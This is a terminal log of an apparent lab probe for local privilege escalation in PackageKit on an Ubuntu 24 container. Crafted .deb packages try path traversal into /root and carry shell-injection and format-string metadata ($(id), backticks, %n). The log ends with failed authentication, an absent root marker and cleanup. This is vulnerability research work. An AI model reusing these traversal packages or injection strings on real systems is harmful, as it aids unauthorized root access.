signal /40_aacacccc org.freedesktop.PackageKit.Transaction.Finished (1, 0)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
tx=/41_bacaecdc props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=8: ok
signal /41_bacaecdc org.freedesktop.PackageKit.Transaction.Package (10, 'pk-local-control-traversal;1.0;all;+manual:local', 'control tar traversal parser package')
signal /41_bacaecdc org.freedesktop.PackageKit.Transaction.ItemProgress ('pk-local-control-traversal;1.0;all;+manual:local', 8, 0)
signal /41_bacaecdc org.freedesktop.PackageKit.Transaction.Package (18, 'pk-local-control-traversal;1.0;all;+manual:local', 'control tar traversal parser package')
signal /41_bacaecdc org.freedesktop.PackageKit.Transaction.Finished (1, 22)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
tx=/42_accebbde props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=0: ok
signal /42_accebbde org.freedesktop.PackageKit.Transaction.ErrorCode (48, 'Failed to obtain authentication.')
signal /42_accebbde org.freedesktop.PackageKit.Transaction.Finished (2, 0)

== GetDetailsLocal /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
tx=/43_eeaceced props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetDetailsLocal: ok
signal /43_eeaceced org.freedesktop.PackageKit.Transaction.Details ({'package-id': 'pk-local-data-traversal;1.0;all;local', 'group': 20, 'summary': 'data tar traversal parser package', 'description': 'Attempts to prove whether metadata/file-list code extracts data members unsafely.', 'url': '', 'license': 'unknown', 'size': 20672},)
signal /43_eeaceced org.freedesktop.PackageKit.Transaction.Finished (1, 13)

== GetFilesLocal /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
tx=/44_ddabedcc props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetFilesLocal: ok
signal /44_ddabedcc org.freedesktop.PackageKit.Transaction.Files ('pk-local-data-traversal;1.0;all;/tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb', ['/usr/local/share/packagekit-local-deb-parser/data.txt', '/root/packagekit_local_deb_parser_data_parent_escape', '/root/packagekit_local_deb_parser_data_absolute_escape'])
signal /44_ddabedcc org.freedesktop.PackageKit.Transaction.Finished (1, 0)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
tx=/45_bdaeedcc props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=8: ok
signal /45_bdaeedcc org.freedesktop.PackageKit.Transaction.Package (10, 'pk-local-data-traversal;1.0;all;+manual:local', 'data tar traversal parser package')
signal /45_bdaeedcc org.freedesktop.PackageKit.Transaction.ItemProgress ('pk-local-data-traversal;1.0;all;+manual:local', 8, 0)
signal /45_bdaeedcc org.freedesktop.PackageKit.Transaction.Package (18, 'pk-local-data-traversal;1.0;all;+manual:local', 'data tar traversal parser package')
signal /45_bdaeedcc org.freedesktop.PackageKit.Transaction.Finished (1, 21)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
tx=/46_ddeacede props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=0: ok
signal /46_ddeacede org.freedesktop.PackageKit.Transaction.ErrorCode (48, 'Failed to obtain authentication.')
signal /46_ddeacede org.freedesktop.PackageKit.Transaction.Finished (2, 0)

$ docker exec ubuntu24-server-lpe-target runuser -u selfauth -- bash -lc $'\nset -euo pipefail\necho "== PackageKit local parser D-Bus drive as $(id) =="\n/tmp/packagekit-local-deb-parser/pk_local_parser_driver.py \\\n  /tmp/packagekit-local-deb-parser/pk-local-normal.deb \\\n  /tmp/packagekit-local-deb-parser/pk-local-weird.deb \\\n  /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb \\\n  /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb\n'
== PackageKit local parser D-Bus drive as uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth) ==
driver uid props: system-bus connected, files=4

== GetDetailsLocal /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
tx=/47_abbbddca props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetDetailsLocal: ok
signal /47_abbbddca org.freedesktop.PackageKit.Transaction.Details ({'package-id': 'pk-local-normal;1.0;all;local', 'group': 20, 'summary': 'normal local parser package', 'description': 'Confirms metadata parsing does not run maintainer scripts.', 'url': '', 'license': 'unknown', 'size': 762},)
signal /47_abbbddca org.freedesktop.PackageKit.Transaction.Finished (1, 14)

== GetFilesLocal /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
tx=/48_dedcadbc props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetFilesLocal: ok
signal /48_dedcadbc org.freedesktop.PackageKit.Transaction.Files ('pk-local-normal;1.0;all;/tmp/packagekit-local-deb-parser/pk-local-normal.deb', ['/', '/usr', '/usr/local', '/usr/local/share', '/usr/local/share/packagekit-local-deb-parser', '/usr/local/share/packagekit-local-deb-parser/payload.txt'])
signal /48_dedcadbc org.freedesktop.PackageKit.Transaction.Finished (1, 0)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
tx=/49_aaeddded props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=8: ok
signal /49_aaeddded org.freedesktop.PackageKit.Transaction.Package (10, 'pk-local-normal;1.0;all;+manual:local', 'normal local parser package')
signal /49_aaeddded org.freedesktop.PackageKit.Transaction.ItemProgress ('pk-local-normal;1.0;all;+manual:local', 8, 0)
signal /49_aaeddded org.freedesktop.PackageKit.Transaction.Package (18, 'pk-local-normal;1.0;all;+manual:local', 'normal local parser package')
signal /49_aaeddded org.freedesktop.PackageKit.Transaction.Finished (1, 23)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
tx=/50_addbbcda props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=0: ok
signal /50_addbbcda org.freedesktop.PackageKit.Transaction.ErrorCode (48, 'Failed to obtain authentication.')
signal /50_addbbcda org.freedesktop.PackageKit.Transaction.Finished (2, 0)

== GetDetailsLocal /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
tx=/51_daadacce props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetDetailsLocal: ok
signal /51_daadacce org.freedesktop.PackageKit.Transaction.Details ({'package-id': 'pk-local-weird;1.0+meta~probe;all;local', 'group': 20, 'summary': 'weird local metadata package with parser punctuation', 'description': 'Continuation line with semicolons ;;;;;, percent escapes %n %s %x, unicode-looking bytes kept ascii, shell-looking text $(id), backticks `id`, and absolute paths /root/packagekit_local_deb_parser_metadata.\n\nFinal paragraph for multiline metadata.', 'url': 'file:///tmp/packagekit-local-deb-parser/%0a/root/packagekit_local_deb_parser_homepage', 'license': 'unknown', 'size': 884},)
signal /51_daadacce org.freedesktop.PackageKit.Transaction.Finished (1, 13)

== GetFilesLocal /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
tx=/52_adcaaecb props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetFilesLocal: ok
signal /52_adcaaecb org.freedesktop.PackageKit.Transaction.Files ('pk-local-weird;1.0+meta~probe;all;/tmp/packagekit-local-deb-parser/pk-local-weird.deb', ['/', '/usr', '/usr/local', '/usr/local/share', '/usr/local/share/packagekit-local-deb-parser', '/usr/local/share/packagekit-local-deb-parser/weird.txt'])
signal /52_adcaaecb org.freedesktop.PackageKit.Transaction.Finished (1, 0)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
tx=/53_eeeeecbc props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=8: ok
signal /53_eeeeecbc org.freedesktop.PackageKit.Transaction.Package (10, 'pk-local-weird;1.0+meta~probe;all;+manual:local', 'weird local metadata package with parser punctuation')
signal /53_eeeeecbc org.freedesktop.PackageKit.Transaction.ItemProgress ('pk-local-weird;1.0+meta~probe;all;+manual:local', 8, 0)
signal /53_eeeeecbc org.freedesktop.PackageKit.Transaction.Package (18, 'pk-local-weird;1.0+meta~probe;all;+manual:local', 'weird local metadata package with parser punctuation')
signal /53_eeeeecbc org.freedesktop.PackageKit.Transaction.Finished (1, 21)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
tx=/54_eeebcdaa props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=0: ok
signal /54_eeebcdaa org.freedesktop.PackageKit.Transaction.ErrorCode (48, 'Failed to obtain authentication.')
signal /54_eeebcdaa org.freedesktop.PackageKit.Transaction.Finished (2, 0)

== GetDetailsLocal /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
tx=/55_aecabedd props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetDetailsLocal: ok
signal /55_aecabedd org.freedesktop.PackageKit.Transaction.Details ({'package-id': 'pk-local-control-traversal;1.0;all;local', 'group': 20, 'summary': 'control tar traversal parser package', 'description': 'Attempts to prove whether root PackageKit extracts control members unsafely.', 'url': '', 'license': 'unknown', 'size': 20672},)
signal /55_aecabedd org.freedesktop.PackageKit.Transaction.Finished (1, 13)

== GetFilesLocal /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
tx=/56_ebdedebd props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetFilesLocal: ok
signal /56_ebdedebd org.freedesktop.PackageKit.Transaction.Files ('pk-local-control-traversal;1.0;all;/tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb', ['/usr/local/share/packagekit-local-deb-parser/control.txt'])
signal /56_ebdedebd org.freedesktop.PackageKit.Transaction.Finished (1, 0)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
tx=/57_ebaacbed props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=8: ok
signal /57_ebaacbed org.freedesktop.PackageKit.Transaction.Package (10, 'pk-local-control-traversal;1.0;all;+manual:local', 'control tar traversal parser package')
signal /57_ebaacbed org.freedesktop.PackageKit.Transaction.ItemProgress ('pk-local-control-traversal;1.0;all;+manual:local', 8, 0)
signal /57_ebaacbed org.freedesktop.PackageKit.Transaction.Package (18, 'pk-local-control-traversal;1.0;all;+manual:local', 'control tar traversal parser package')
signal /57_ebaacbed org.freedesktop.PackageKit.Transaction.Finished (1, 20)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
tx=/58_bddedcee props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=0: ok
signal /58_bddedcee org.freedesktop.PackageKit.Transaction.ErrorCode (48, 'Failed to obtain authentication.')
signal /58_bddedcee org.freedesktop.PackageKit.Transaction.Finished (2, 0)

== GetDetailsLocal /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
tx=/59_deededca props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetDetailsLocal: ok
signal /59_deededca org.freedesktop.PackageKit.Transaction.Details ({'package-id': 'pk-local-data-traversal;1.0;all;local', 'group': 20, 'summary': 'data tar traversal parser package', 'description': 'Attempts to prove whether metadata/file-list code extracts data members unsafely.', 'url': '', 'license': 'unknown', 'size': 20672},)
signal /59_deededca org.freedesktop.PackageKit.Transaction.Finished (1, 13)

== GetFilesLocal /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
tx=/60_adaccbaa props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetFilesLocal: ok
signal /60_adaccbaa org.freedesktop.PackageKit.Transaction.Files ('pk-local-data-traversal;1.0;all;/tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb', ['/usr/local/share/packagekit-local-deb-parser/data.txt', '/root/packagekit_local_deb_parser_data_parent_escape', '/root/packagekit_local_deb_parser_data_absolute_escape'])
signal /60_adaccbaa org.freedesktop.PackageKit.Transaction.Finished (1, 0)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
tx=/61_debcebdb props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=8: ok
signal /61_debcebdb org.freedesktop.PackageKit.Transaction.Package (10, 'pk-local-data-traversal;1.0;all;+manual:local', 'data tar traversal parser package')
signal /61_debcebdb org.freedesktop.PackageKit.Transaction.ItemProgress ('pk-local-data-traversal;1.0;all;+manual:local', 8, 0)
signal /61_debcebdb org.freedesktop.PackageKit.Transaction.Package (18, 'pk-local-data-traversal;1.0;all;+manual:local', 'data tar traversal parser package')
signal /61_debcebdb org.freedesktop.PackageKit.Transaction.Finished (1, 20)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
tx=/62_daeaceec props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=0: ok
signal /62_daeaceec org.freedesktop.PackageKit.Transaction.ErrorCode (48, 'Failed to obtain authentication.')
signal /62_daeaceec org.freedesktop.PackageKit.Transaction.Finished (2, 0)

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== root proof check =="\nif ls -l /root/packagekit_local_deb_parser_* 2>/dev/null; then\n  for marker in /root/packagekit_local_deb_parser_*; do\n    echo "--- $marker"\n    sed -n "1,40p" "$marker" || true\n  done\nelse\n  echo "ROOT_MARKER_ABSENT"\nfi\necho\necho "== install-state check =="\ndpkg-query -W -f="\\${binary:Package}\\t\\${Version}\\t\\${Status}\\n" \\\n  pk-local-normal pk-local-weird pk-local-control-traversal pk-local-data-traversal 2>&1 || true\necho\necho "== temp/artifact check =="\nfind /tmp -maxdepth 2 \\( -name "packagekit-local-deb-parser*" -o -name "pk-local-*" \\) -print -exec ls -ld {} \\; 2>/dev/null | sed -n "1,120p"\necho\necho "== daemon health =="\nsystemctl is-active packagekit.service polkit.service dbus.service\nsystemctl --failed --no-pager || true\necho\necho "== PackageKit journal since probe start =="\njournalctl --no-pager -u packagekit.service --since "2026-05-16 16:52:09" | tail -n 160 || true\n'
== root proof check ==
ROOT_MARKER_ABSENT

== install-state check ==
dpkg-query: no packages found matching pk-local-normal
dpkg-query: no packages found matching pk-local-weird
dpkg-query: no packages found matching pk-local-control-traversal
dpkg-query: no packages found matching pk-local-data-traversal

== temp/artifact check ==
/tmp/packagekit-local-deb-parser
drwxr-xr-x 5 attacker attacker 200 May 16 16:52 /tmp/packagekit-local-deb-parser
/tmp/packagekit-local-deb-parser/pk-local-normal.deb
-rw-r--r-- 1 attacker attacker 762 May 16 16:52 /tmp/packagekit-local-deb-parser/pk-local-normal.deb
/tmp/packagekit-local-deb-parser/pk-local-weird.deb
-rw-r--r-- 1 attacker attacker 884 May 16 16:52 /tmp/packagekit-local-deb-parser/pk-local-weird.deb
/tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb
-rw-r--r-- 1 attacker attacker 20672 May 16 16:52 /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb
/tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb
-rw-r--r-- 1 attacker attacker 20672 May 16 16:52 /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb

== daemon health ==
active
active
active
  UNIT LOAD ACTIVE SUB DESCRIPTION

0 loaded units listed.

== PackageKit journal since probe start ==
May 16 16:52:09 4f5b414436ae PackageKit[731642]: get-details-local transaction /31_bcbeadea from uid 1001 finished with success after 12ms
May 16 16:52:09 4f5b414436ae PackageKit[731642]: get-files-local transaction /32_ebbcbcdb from uid 1001 finished with success after 0ms
May 16 16:52:09 4f5b414436ae PackageKit[731642]: install-files transaction /33_adcdbcaa from uid 1001 finished with success after 21ms
May 16 16:52:10 4f5b414436ae PackageKit[731642]: uid 1001 is trying to obtain org.freedesktop.packagekit.package-install-untrusted auth (only_trusted:0)
May 16 16:52:10 4f5b414436ae PackageKit[731642]: uid 1001 failed to obtain auth
May 16 16:52:10 4f5b414436ae PackageKit[731642]: get-details-local transaction /35_aeabcacb from uid 1001 finished with success after 13ms
May 16 16:52:10 4f5b414436ae PackageKit[731642]: get-files-local transaction /36_eabebceb from uid 1001 finished with success after 0ms
May 16 16:52:10 4f5b414436ae PackageKit[731642]: install-files transaction /37_cbacdada from uid 1001 finished with success after 21ms
May 16 16:52:11 4f5b414436ae PackageKit[731642]: uid 1001 is trying to obtain org.freedesktop.packagekit.package-install-untrusted auth (only_trusted:0)
May 16 16:52:11 4f5b414436ae PackageKit[731642]: uid 1001 failed to obtain auth
May 16 16:52:11 4f5b414436ae PackageKit[731642]: get-details-local transaction /39_bbeacadd from uid 1001 finished with success after 12ms
May 16 16:52:11 4f5b414436ae PackageKit[731642]: get-files-local transaction /40_aacacccc from uid 1001 finished with success after 0ms
May 16 16:52:11 4f5b414436ae PackageKit[731642]: install-files transaction /41_bacaecdc from uid 1001 finished with success after 22ms
May 16 16:52:12 4f5b414436ae PackageKit[731642]: uid 1001 is trying to obtain org.freedesktop.packagekit.package-install-untrusted auth (only_trusted:0)
May 16 16:52:12 4f5b414436ae PackageKit[731642]: uid 1001 failed to obtain auth
May 16 16:52:12 4f5b414436ae PackageKit[731642]: get-details-local transaction /43_eeaceced from uid 1001 finished with success after 13ms
May 16 16:52:12 4f5b414436ae PackageKit[731642]: get-files-local transaction /44_ddabedcc from uid 1001 finished with success after 0ms
May 16 16:52:13 4f5b414436ae PackageKit[731642]: install-files transaction /45_bdaeedcc from uid 1001 finished with success after 21ms
May 16 16:52:13 4f5b414436ae PackageKit[731642]: uid 1001 is trying to obtain org.freedesktop.packagekit.package-install-untrusted auth (only_trusted:0)
May 16 16:52:13 4f5b414436ae PackageKit[731642]: uid 1001 failed to obtain auth
May 16 16:52:14 4f5b414436ae PackageKit[731642]: get-details-local transaction /47_abbbddca from uid 1002 finished with success after 14ms
May 16 16:52:14 4f5b414436ae PackageKit[731642]: get-files-local transaction /48_dedcadbc from uid 1002 finished with success after 0ms
May 16 16:52:14 4f5b414436ae PackageKit[731642]: install-files transaction /49_aaeddded from uid 1002 finished with success after 23ms
May 16 16:52:14 4f5b414436ae PackageKit[731642]: uid 1002 is trying to obtain org.freedesktop.packagekit.package-install-untrusted auth (only_trusted:0)
May 16 16:52:14 4f5b414436ae PackageKit[731642]: uid 1002 failed to obtain auth
May 16 16:52:15 4f5b414436ae PackageKit[731642]: get-details-local transaction /51_daadacce from uid 1002 finished with success after 13ms
May 16 16:52:15 4f5b414436ae PackageKit[731642]: get-files-local transaction /52_adcaaecb from uid 1002 finished with success after 0ms
May 16 16:52:15 4f5b414436ae PackageKit[731642]: install-files transaction /53_eeeeecbc from uid 1002 finished with success after 21ms
May 16 16:52:15 4f5b414436ae PackageKit[731642]: uid 1002 is trying to obtain org.freedesktop.packagekit.package-install-untrusted auth (only_trusted:0)
May 16 16:52:15 4f5b414436ae PackageKit[731642]: uid 1002 failed to obtain auth
May 16 16:52:16 4f5b414436ae PackageKit[731642]: get-details-local transaction /55_aecabedd from uid 1002 finished with success after 13ms
May 16 16:52:16 4f5b414436ae PackageKit[731642]: get-files-local transaction /56_ebdedebd from uid 1002 finished with success after 0ms
May 16 16:52:16 4f5b414436ae PackageKit[731642]: install-files transaction /57_ebaacbed from uid 1002 finished with success after 20ms
May 16 16:52:16 4f5b414436ae PackageKit[731642]: uid 1002 is trying to obtain org.freedesktop.packagekit.package-install-untrusted auth (only_trusted:0)
May 16 16:52:16 4f5b414436ae PackageKit[731642]: uid 1002 failed to obtain auth
May 16 16:52:17 4f5b414436ae PackageKit[731642]: get-details-local transaction /59_deededca from uid 1002 finished with success after 13ms
May 16 16:52:17 4f5b414436ae PackageKit[731642]: get-files-local transaction /60_adaccbaa from uid 1002 finished with success after 0ms
May 16 16:52:17 4f5b414436ae PackageKit[731642]: install-files transaction /61_debcebdb from uid 1002 finished with success after 20ms
May 16 16:52:17 4f5b414436ae PackageKit[731642]: uid 1002 is trying to obtain org.freedesktop.packagekit.package-install-untrusted auth (only_trusted:0)
May 16 16:52:17 4f5b414436ae PackageKit[731642]: uid 1002 failed to obtain auth

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== cleanup =="\ndpkg -r pk-local-normal pk-local-weird pk-local-control-traversal pk-local-data-traversal 2>/dev/null || true\nrm -rf /tmp/packagekit-local-deb-parser\nrm -f /root/packagekit_local_deb_parser_*\nsystemctl reset-failed packagekit.service polkit.service dbus.service 2>/dev/null || true\necho "== cleanup verification =="\nls -l /root/packagekit_local_deb_parser_* 2>/dev/null || echo "no root markers"\ntest ! -e /tmp/packagekit-local-deb-parser && echo "no /tmp probe directory"\ndpkg-query -W pk-local-normal pk-local-weird pk-local-control-traversal pk-local-data-traversal 2>&1 || true\nsystemctl is-active packagekit.service polkit.service dbus.service\n'
== cleanup ==
== cleanup verification ==
no root markers
no /tmp probe directory
dpkg-query: no packages found matching pk-local-normal
dpkg-query: no packages found matching pk-local-weird
dpkg-query: no packages found matching pk-local-control-traversal
dpkg-query: no packages found matching pk-local-data-traversal
active
active
active
